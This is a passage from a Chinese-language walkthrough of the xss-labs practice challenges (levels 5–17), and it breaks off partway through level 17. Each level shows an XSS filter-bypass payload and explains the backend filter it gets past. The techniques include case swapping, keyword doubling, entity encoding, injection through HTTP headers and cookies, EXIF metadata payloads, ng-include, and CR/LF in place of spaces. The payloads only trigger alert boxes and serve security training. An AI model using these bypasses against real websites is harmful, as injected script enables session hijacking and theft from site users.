title="后台源代码分析"></a>后台源代码分析</h2><p>对get提交的keyword参数，<code>script</code>替换成<code>scr_ipt</code>,<code>on</code>替换成<code>o_n</code>，<code>htmlspecialchars</code>函数把预定义的字符转换为 HTML 实体后，输出在html中   </p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/024-image.jpg"></p><h2 id="level-6：事件或javascript伪协议大小写绕过"><a href="#level-6：事件或javascript伪协议大小写绕过" class="headerlink" title="level 6：事件或javascript伪协议大小写绕过"></a>level 6：事件或javascript伪协议大小写绕过</h2><h2 id="过程-5"><a href="#过程-5" class="headerlink" title="过程"></a>过程</h2><p>先右键查看原始的页面源代码，发现是双引号闭合，经测试替换了<code>script</code>，<code>on</code>，没有过滤<code>&lt;&gt;</code>。构造a标签，利用href属性支持javascript伪协议构造payload，可是后台对href关键字进行替换。那么这里用大小写来绕过：<code>&quot;&gt;&lt;a Href=&#39;javascript:alert(1)&#39;&gt;</code>，然后手动点击</p><p>还有可以on大小写绕过：<code>&quot; Onclick=&quot;alert(1)</code>，记得搜索完要手动点击下框才能成功</p><h2 id="后台源代码分析-5"><a href="#后台源代码分析-5" class="headerlink" title="后台源代码分析"></a>后台源代码分析</h2><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/025-image.jpg"></p><p>对get提交的keyword参数，<code>str_replace</code>函数替换<code>&lt;script</code>、<code>on</code>、<code>src</code>、<code>data</code>、<code>href</code>关键字，采用<code>htmlspecialchars</code>函数把预定义的字符转换为 HTML 实体后输出在html中</p><h2 id="level-7：javascript伪协议双写绕过"><a href="#level-7：javascript伪协议双写绕过" class="headerlink" title="level 7：javascript伪协议双写绕过"></a>level 7：javascript伪协议双写绕过</h2><h2 id="过程-6"><a href="#过程-6" class="headerlink" title="过程"></a>过程</h2><p>先右键查看原始的页面源代码，发现是双引号闭合，构造<code>&quot;&gt;&lt;a href=&#39;javascript:alert(1)&#39;&gt;</code>，根据返回的html，发现过滤了<code>href</code>和<code>script</code>。尝试大小写不能进行绕过。</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/026-image.jpg"></p><p>那么这里尝试双写绕过：<code>&quot;&gt;&lt;a hhrefref=&#39;javasscriptcript:alert(1)&#39;&gt;</code>，然后点击，成功绕过触发xss</p><h2 id="后台源代码分析-6"><a href="#后台源代码分析-6" class="headerlink" title="后台源代码分析"></a>后台源代码分析</h2><p>先将get方式提交的keyword参数通过<code>strtolower</code>函数转换为小写，<code>str_replace</code>函数将关键字<code>script</code>、<code>on</code>、<code>src</code>、<code>data</code>、<code>href</code>关键字替换成空，然后输出在html中</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/027-image.jpg"></p><h2 id="level-8：javascript伪协议实体编码绕过"><a href="#level-8：javascript伪协议实体编码绕过" class="headerlink" title="level 8：javascript伪协议实体编码绕过"></a>level 8：javascript伪协议实体编码绕过</h2><h2 id="过程-7"><a href="#过程-7" class="headerlink" title="过程"></a>过程</h2><p>这里可以看到有个友情链接，那么本身就有a标签href属性了。像下面点击友情链接就能跳转到百度了。</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/028-image.jpg"></p><p>想到可以调用外部js，但事实并没那么简单，因为完成目标需要在本页面弹窗，才会显示输出，并跳转到下一关。因为这里是先添加一个链接，再打开这个链接，会打开另一个界面，就不在本界面弹窗，所以外部调用不可行，那么只能用javascript伪协议。</p><p>那么这里直接写javascript伪协议：<code>javascript:alert(1)</code>，右键查看原始的页面源代码和F12其实都能看出来变成了<code>javascr_ipt:alert(1)</code>，那么应该是javascript关键字被替换了。那么这里尝试大小写，双写，是都无法进行绕过的。</p><p>那我们只有尝试编码绕过了，用实体编码可绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">十进制实体编码：javascrip&amp;#116;:alert(1)<br>十六进制实体编码：javascrip&amp;#x74;:alert(1)<br>都是将t字符进行实体编码，当然对其他字符进行编码也可以，目的在于绕过服务端的匹配。客户端解析时又会将其转码为t，从而弹窗<br></code></pre></td></tr></table></figure><p>两种选一种输入，然后点击便能成功</p><h2 id="后台源代码分析-7"><a href="#后台源代码分析-7" class="headerlink" title="后台源代码分析"></a>后台源代码分析</h2><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/029-image.jpg"></p><p>先将get方式提交的keyword参数通过<code>strtolower</code>函数转换为小写，用<code>htmlspecialchars</code>函数把预定义的字符转换为 HTML 实体，<code>str_replace</code>函数替换关键字<code>script</code>、<code>on</code>、<code>src</code>、<code>data</code>、<code>href</code>、<code>&quot;</code>，然后输出在a标签的href属性中。</p><h2 id="level-9：javascript伪协议实体编码-注释符-绕过"><a href="#level-9：javascript伪协议实体编码-注释符-绕过" class="headerlink" title="level 9：javascript伪协议实体编码 + 注释符//绕过"></a>level 9：javascript伪协议实体编码 + 注释符<code>//</code>绕过</h2><h2 id="过程-8"><a href="#过程-8" class="headerlink" title="过程"></a>过程</h2><p>这里发现还是有友情链接，那么用level 8的payload，href里直接显示链接不合法，测试发现输入中必须包含<code>http://</code></p><p>那么我们用注释符<code>//</code>绕过即可。构造payload,这边有两种方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">十进制实体编码：javascrip&amp;#116;:alert(1)//http://127.0.0.1<br>十六进制实体编码：javascrip&amp;#x74;:alert(1)//http://127.0.0.1<br></code></pre></td></tr></table></figure><p>也可以直接这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">十进制实体编码：javascrip&amp;#116;:alert(&#x27;http://127.0.0.1&#x27;)<br>十六进制实体编码：javascrip&amp;#x74;:alert(&#x27;http://127.0.0.1&#x27;)<br></code></pre></td></tr></table></figure><p>然后点击就成功了</p><h2 id="后台源代码分析-8"><a href="#后台源代码分析-8" class="headerlink" title="后台源代码分析"></a>后台源代码分析</h2><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/030-image.jpg"></p><p>先将get方式提交的keyword参数通过<code>strtolower</code>函数转换为小写，get提交的keyword参数用<code>htmlspecialchars</code>函数把预定义的字符转换为 HTML 实体，<code>str_replace</code>函数替换关键字<code>script</code>、<code>on</code>、<code>src</code>、<code>data</code>、<code>href</code>、<code>&quot;</code>，判断该变量有无http:&#x2F;&#x2F;</p><h2 id="level-10：隐藏表单用GET方式自己创建text文本框配合事件绕过"><a href="#level-10：隐藏表单用GET方式自己创建text文本框配合事件绕过" class="headerlink" title="level 10：隐藏表单用GET方式自己创建text文本框配合事件绕过"></a>level 10：隐藏表单用GET方式自己创建text文本框配合事件绕过</h2><h2 id="过程-9"><a href="#过程-9" class="headerlink" title="过程"></a>过程</h2><p>keywordget传的参数值输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，右键查看原始的页面源代码发现输出的地方进行了html实体编码，一时间不知道该如何解决。我感觉也只有这一个输出点了：</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/031-image.jpg"></p><p>然后再详细查看页面源代码，发现可能有隐藏的表单，尝试提交t_link、t_history、t_sort参数：<code>?keyword=&lt;script&gt;alert(1)&lt;/script&gt;&amp;t_link=&lt;script&gt;alert(1)&lt;/script&gt;&amp;t_history=&lt;script&gt;alert(1)&lt;/script&gt;&amp;t_sort=&lt;script&gt;alert(1)&lt;/script&gt;</code>，最后发现只有t_sort参数接收了并返回在了html的value中：</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/032-image.jpg"></p><p>只不过其中的尖括号被过滤了。也发现了是用<code>&quot;</code>双引号闭合。那么构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">?t_sort=&quot;type=&quot;text&quot; onclick=&quot;alert(1)&quot;&gt;&lt;  //因为页面中没有触发事件框，所以type=&quot;text&quot;构造一个文本框<br></code></pre></td></tr></table></figure><p>然后页面会出现一个框，点击它，成功</p><h2 id="后台源代码分析-9"><a href="#后台源代码分析-9" class="headerlink" title="后台源代码分析"></a>后台源代码分析</h2><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/033-image.jpg"></p><p>获取了get请求的keyword参数、t_sort参数，t_sort参数的键值也是可定义的，t_sort参数过滤掉了尖括号，输出在value属性中。</p><h2 id="level-11：隐藏表单用Referer字段自己创建text文本框配合事件绕过"><a href="#level-11：隐藏表单用Referer字段自己创建text文本框配合事件绕过" class="headerlink" title="level 11：隐藏表单用Referer字段自己创建text文本框配合事件绕过"></a>level 11：隐藏表单用Referer字段自己创建text文本框配合事件绕过</h2><h2 id="过程-10"><a href="#过程-10" class="headerlink" title="过程"></a>过程</h2><p>这一关和level 10相似，也是隐藏表单，只不过这里是有两个参数可以接收并返回在了html的value中，分别是t_sort参数和t_ref参数，但是t_sort参数输入level 10的payload：<code>?t_sort=&quot;type=&quot;text&quot; onclick=&quot;alert(1)&quot;&gt;&lt;</code>时，右键查看原始的页面源代码发现<code>&quot;</code>双引号和尖括号都给实体编码了：</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/034-image.jpg"></p><p>这里应该是用了<code>htmlspecialchars</code>函数把预定义的字符转换为 HTML 实体，没什么希望了。那么来看看t_ref参数：</p><p>t_ref参数接收了并返回在了html的value中，而且不是像t_sort参数那样以get方式来获取值，而是获取http头里的Referer字段。</p><p>那么这里就要用到burpsuite来抓包了：</p><p>payload：<code>Referer:&quot;type=&quot;text&quot; onclick=&quot;alert(1)&quot;&gt;&lt;</code></p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/035-image.jpg"></p><p>这里有个疑惑：经过测试，<code>Referer</code>字段加在最后一行即<code>Accept-Language</code>字段下面一行就不能成功，而其它地方都是可以成功的。如果知道的人可以指教一下~</p><p>然后页面会生成一个框，点它，成功</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/036-image.jpg"></p><h2 id="后台源代码分析-10"><a href="#后台源代码分析-10" class="headerlink" title="后台源代码分析"></a>后台源代码分析</h2><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/037-image.jpg"></p><p>获取get请求的keyword、t_sort参数和<code>Referer</code>字段，get提交的t_sort参数用<code>htmlspecialchars</code>函数把预定义的字符转换为 HTML 实体、过滤<code>Referer</code>字段的尖括号后输出在html代码中</p><h2 id="level-12：隐藏表单用User-Agent字段自己创建text文本框配合事件绕过"><a href="#level-12：隐藏表单用User-Agent字段自己创建text文本框配合事件绕过" class="headerlink" title="level 12：隐藏表单用User-Agent字段自己创建text文本框配合事件绕过"></a>level 12：隐藏表单用User-Agent字段自己创建text文本框配合事件绕过</h2><h2 id="过程-11"><a href="#过程-11" class="headerlink" title="过程"></a>过程</h2><p>这一关和level 11相似，也是隐藏表单，这里也是有两个参数可以接收并返回在了html的value中，分别是t_sort参数和t_ua参数。关于t_sort参数的分析和level 11的一样，具体可看level 11。</p><p>那么这里来看看t_ua参数：</p><p>t_ua参数接收了并返回在了html的value中，而且不是像t_sort参数那样以get方式来获取值，而是获取http头里的<code>User-Agent</code>字段。</p><p>那么这里就要用到burpsuite来抓包了：</p><p>payload：<code>User-Agent:&quot;type=&quot;text&quot; onclick=&quot;alert(1)&quot;&gt;&lt;</code></p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/038-image.jpg"></p><p>然后页面会生成一个框，点它，成功</p><h2 id="后台源代码分析-11"><a href="#后台源代码分析-11" class="headerlink" title="后台源代码分析"></a>后台源代码分析</h2><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/039-image.jpg"></p><p>获取get请求的keyword、t_sort变量和<code>User-Agent</code>字段，get提交的t_sort参数用<code>htmlspecialchars</code>函数把预定义的字符转换为 HTML 实体、过滤<code>User-Agent</code>字段的尖括号后输出在html代码中</p><h2 id="level-13：隐藏表单用Cookie字段自己创建text文本框配合事件绕过"><a href="#level-13：隐藏表单用Cookie字段自己创建text文本框配合事件绕过" class="headerlink" title="level 13：隐藏表单用Cookie字段自己创建text文本框配合事件绕过"></a>level 13：隐藏表单用Cookie字段自己创建text文本框配合事件绕过</h2><h2 id="过程-12"><a href="#过程-12" class="headerlink" title="过程"></a>过程</h2><p>这一关和level 11相似，也是隐藏表单，这里也是有两个参数可以接收并返回在了html的value中，分别是t_sort参数和t_cook参数。关于t_sort参数的分析和level 11的一样，具体可看level 11。</p><p>那么这里来看看t_cook参数：</p><p>t_cook参数接收了并返回在了html的value中，而且不是像t_sort参数那样以get方式来获取值，而是获取http头里的<code>Cookie</code>字段中user的cookie值。</p><p>这里先来简单介绍下cookie的机制：</p><p>当用户第一次访问并登陆一个网站的时候，cookie的设置以及发送会经历以下4个步骤：</p><p>客户端发送一个请求到服务器--&gt; 服务器发送一个HttpResponse响应到客户端，其中包含Set-Cookie的头部--&gt; 客户端保存cookie，之后向服务器发送请求时，HttpRequest请求中会包含一个Cookie的头部--&gt;服务器返回响应数据</p><p>那么这里就要用到burpsuite来抓包了：</p><p>这里我们首先把Proxy里抓到的请求包发送到Intruder里，这时候可以看到请求包这里还没有cookie。然后服务器发送一个HttpResponse响应到客户端，其中包含<code>Set-Cookie</code>的头部</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/040-image.jpg"></p><p>然后这时候再把Proxy里的包都放(Forward)了，然后再用burp重新拦截，再刷新下网站，这时候我们的请求包里才有了Cookie字段：<code>Cookie: user=call+me+maybe%3F</code>。然后改成下面的payload:</p><p>payload：<code>Cookie:user=&quot;type=&quot;text&quot; onclick=&quot;alert(1)&quot;&gt;&lt;</code></p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/041-image.jpg"></p><p>放包后，然后页面会生成一个框，点它，成功</p><h2 id="后台源代码分析-12"><a href="#后台源代码分析-12" class="headerlink" title="后台源代码分析"></a>后台源代码分析</h2><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/042-image.jpg"></p><p>获取get请求的keyword、t_sort变量和<code>Cookie</code>字段中user的cookie值，get提交的t_sort参数用<code>htmlspecialchars</code>函数把预定义的字符转换为 HTML 实体、过滤<code>Cookie</code>字段中user的cookie值的尖括号后输出在html代码中</p><h2 id="level-14：exif-xss-上传一个含有xss代码的图片触发xss"><a href="#level-14：exif-xss-上传一个含有xss代码的图片触发xss" class="headerlink" title="level 14：exif xss(上传一个含有xss代码的图片触发xss)"></a>level 14：exif xss(上传一个含有xss代码的图片触发xss)</h2><h2 id="过程-13"><a href="#过程-13" class="headerlink" title="过程"></a>过程</h2><p>这一关先查看页面源码，通过<code>iframe</code>标签引入了一个<code>http://exofvoewer.org</code>。因为<code>iframe</code>调用的文件地址访问失败，已经无法进行测试了。</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/043-image.jpg"></p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/044-image.jpg"></p><p>结合网上师傅们的文章，了解到这关主要考察的是<code>exif xss</code>漏洞，一般利用于文件上传的地方，最经典的就是头像上传，上传一个图片，该图片的<code>exif</code>元数据被修改为xss的payload,成功利用弹框。</p><p>具体实现可以使用kali下的<code>exiftool</code>工具，命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">exiftool -FIELD=XSS FILE<br><br>exiftool -Artist=’ “&gt;&lt;img src=1 οnerrοr=alert(document.domain)&gt;’ brute.jpeg<br></code></pre></td></tr></table></figure><p>这里可以参考这位师傅的文章：<a href="https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12%EF%BC%8C%E8%BF%99%E9%87%8C%E4%B8%BA%E4%BA%86%E6%96%B9%E4%BE%BF%E7%9B%B4%E6%8E%A5%E6%88%AA%E5%8F%96%E6%96%87%E7%AB%A0%E4%B8%AD%E7%9A%84%E5%9B%BE%E7%89%87">https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12，这里为了方便直接截取文章中的图片</a></p><p>其实以前乌云就爆出个这个<code>exif xss</code>漏洞，上传一个含有xss代码的图片触发xss。</p><p><code>exif xss</code>：</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/045-image.jpg"></p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/046-image.jpg"></p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/047-image.jpg"></p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/048-image.jpg"></p><h2 id="后台源代码分析-13"><a href="#后台源代码分析-13" class="headerlink" title="后台源代码分析"></a>后台源代码分析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;<br>&lt;title&gt;欢迎来到level 14&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level 14&lt;/h1&gt;<br>&lt;center&gt;&lt;iframe name=&quot;leftframe&quot; marginwidth=10 marginheight=10 src=&quot;http://www.exifviewer.org/&quot; frameborder=no width=&quot;80%&quot; scrolling=&quot;no&quot; height=80%&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;center&gt;这关成功后不会自动跳转。成功者&lt;a href=/xss/level 15.php?src=1.gif&gt;点我进level 15&lt;/a&gt;&lt;/center&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>这一关的后台源代码其实就是原始的页面源代码了，在上面过程也有总结，这里就不赘述了。</p><h2 id="level-15：ng-include包含同一域名下有xss漏洞的文件来触发xss"><a href="#level-15：ng-include包含同一域名下有xss漏洞的文件来触发xss" class="headerlink" title="level 15：ng-include包含同一域名下有xss漏洞的文件来触发xss"></a>level 15：ng-include包含同一域名下有xss漏洞的文件来触发xss</h2><h2 id="过程-14"><a href="#过程-14" class="headerlink" title="过程"></a>过程</h2><p>这一关提示让我自己走出去。这里看来只能在url里面操作了。url中发现了<code>src</code>参数，我修改<code>src=javascript:alert(1)</code>，回车后，右键查看原始的页面源代码，发现它把<code>src</code>的参数值拼接到了最后一行<code>&lt;body&gt;&lt;span class=&quot;ng-include:javascript:alert(1)&quot;&gt;&lt;/span&gt;&lt;/body&gt;</code>里输出。</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/049-image.jpg"></p><p>这里使用了<code>ng-include</code>属性，这里来介绍一下：</p><p><code>AngularJS</code>中的<code>ng-include</code>指令:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">ng-include指令用于包含外部的 HTML 文件。<br><br>包含的内容将作为指定元素的子节点。<br><br>ng-include属性的值可以是一个表达式，返回一个文件名。<br><br>默认情况下，包含的文件需要包含在同一个域名下。<br></code></pre></td></tr></table></figure><p>那么这里就用包含同一个域名下有xss漏洞的文件，触发xss。这里需要注意一点：这里一定要访问上面的<code>angular.min.js</code>这个js文件，才能进行包含。</p><p>那么这里来构造payload：<code>?src=&#39;http://同一域名/xss-labs-master/level 1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#39;</code></p><p>也可以是<code>?src=&#39;level 1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#39;</code></p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/050-image.jpg"></p><h2 id="后台源代码分析-14"><a href="#后台源代码分析-14" class="headerlink" title="后台源代码分析"></a>后台源代码分析</h2><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/051-image.jpg"></p><p><code>ng-include</code>属性采用<code>htmlspecialchars</code>函数对获取的src参数中的预定义的字符转换为 HTML 实体。</p><h2 id="level-16：用回车符CR-0d-和换行符LF-0a-取代空格绕过"><a href="#level-16：用回车符CR-0d-和换行符LF-0a-取代空格绕过" class="headerlink" title="level 16：用回车符CR(%0d) 和换行符LF(%0a)取代空格绕过"></a>level 16：用回车符CR(%0d) 和换行符LF(%0a)取代空格绕过</h2><h2 id="过程-15"><a href="#过程-15" class="headerlink" title="过程"></a>过程</h2><p>经过测试，发现对<code>script</code>、<code>/</code>、<code>空格</code>进行了转换，需要进行绕过：</p><p>这里用回车符CR(%0d) 和换行符LF(%0a)取代空格（在HTML中%0a和%0d是可以当成空格使用的）</p><p>payload：<code>?keyword=&lt;img%0asrc=1%0donerror=alert(1)&gt;</code></p><p>或者<code>&lt;img%0asrc=1%0donmouseover=alert(1)&gt;</code></p><p>我们用<code>&lt;img%0asrc=1%0donmouseover=alert(1)&gt;</code>，这样可以查看原始的页面源代码：</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/052-image.jpg"></p><p>页面会有个发生了错误的图片，把鼠标移到上面，便成功</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/053-image.jpg"></p><h2 id="后台源代码分析-15"><a href="#后台源代码分析-15" class="headerlink" title="后台源代码分析"></a>后台源代码分析</h2><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/054-image.jpg"></p><p>先将get方式提交的keyword参数通过<code>strtolower</code>函数转换为小写，然后采用<code>strtolower</code>函数过滤掉其中的<code>script</code>、<code>空格</code>、<code>/</code></p><h2 id="level-17：swf文件导致的flash-xss漏洞误会"><a href="#level-17：swf文件导致的flash-xss漏洞误会" class="headerlink" title="level 17：swf文件导致的flash xss漏洞误会"></a>level 17：swf文件导致的<code>flash xss</code>漏洞误会</h2><h2 id="过程-16"><a href="#过程-16" class="headerlink" title="过程"></a>过程</h2><p>右键查看原始的页面源代码，发现了swf文件，这里一开始以为是存在<code>flash xss</code>漏洞，需要利用它来完成。但是一直没有利用成功，结果查了一下，并不需要这样完成</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/055-image.jpg"></p><p>因为这里<code>arg01</code>和<code>arg02</code>提交的参数就存在了注入点：<code>?arg01=q&amp;arg02=a</code>。经过尝试还把尖括号和双引号给html实体编码了</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/056-image.jpg"></p><p>那么构造payload：<code>?arg01=a&amp;arg02= onmouseover=alert(1)</code></p><p>或者<code>?arg01= onmouseover=alert(1)&amp;arg02=b</code></p><p>然后把鼠标移到swf文件上面，便成功了。</p><p>右键查看下原始的页面源代码：</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/057-image.jpg"></p><p>payload中要注意<code>onmouseover</code>事件前面必须要空格，不然会变成这样。下面的后台源代码分析会讲到原理</p><p><img 